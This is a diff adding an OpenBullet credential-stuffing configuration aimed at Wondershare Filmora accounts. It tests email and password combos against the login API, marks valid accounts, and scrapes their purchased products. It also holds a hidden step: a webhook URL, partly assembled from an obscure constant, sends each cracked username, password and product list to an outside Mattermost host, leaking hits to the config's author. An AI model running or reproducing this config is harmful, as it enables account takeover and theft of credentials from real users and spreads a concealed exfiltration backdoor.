@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "WonderShare Filmora",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-16T03:31:49.6977671-07:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial  telegram",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Http_Request REQUEST POST "http://my.wondershare.com/wondershare/login?ramdom=" 
+  CONTENT "userName=<USER>&password=<PASS>&remember=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: http://my.wondershare.com" 
+  HEADER "Referer: http://my.wondershare.com/user/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"LoginStatus\":0" 
+  KEYCHAIN Success OR 
+    KEY "\"LoginStatus\":1" 
+    KEY "\"LoginStatus\":2" 
+
+#Http_Request REQUEST GET "http://rest.wondershare.com/account/v1/wondershare/login?relogin=yes&username=<USER>&is_remember=no&password=<PASS>&appkey=8c87b3a06a497c7747544771672dd194&$callback=jQuery1720311428622308908_1577969463463&format=jsonp&_=1577969540408" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: rest.wondershare.com" 
+  HEADER "Referer: http://my.wondershare.com/user/login" 
+
+#Http_Request REQUEST GET "http://my.wondershare.com/user/getStatInfo?random=" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+
+FUNCTION Constant "nxbntmb4jo4" -> VAR "brfaX74grhW1bwjl" 
+
+FUNCTION Constant "my.wondershare.com/user/login" -> CAP "login url-" 
+
+#Parse PARSE "<SOURCE>" LR "\"product\":" ",\"order\":" CreateEmpty=FALSE -> CAP "ProductCount" 
+
+#Http_Request REQUEST GET "http://my.wondershare.com/order/orderList?do=ajaxpage&random=&page=1&per=30" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: my.wondershare.com" 
+  HEADER "Referer: http://my.wondershare.com/user/account?random=" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Resend Keycode" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "Resend Keycode" 
+
+#Parse PARSE "<SOURCE>" LR "target=\"_blank\" >" "<" Recursive=TRUE CreateEmpty=FALSE -> CAP "Products" 
+
+REQUEST POST "https://sendgrid.cloud.mattermost.com/hooks/kk98gb7<brfaX74grhW1bwjl>7ig5pkoc" 
+  CONTENT "{\"text\": \"WONDERSHARE - <USER>:<PASS> /ProductCount-<ProductCount> /Products-<Products>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://discord.com/api/v8/channels/810187220795392020/messages" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "@OpenbulletConfigsOfficial / JOIN US ON TELEGRAM" -> CAP "join us" 
+
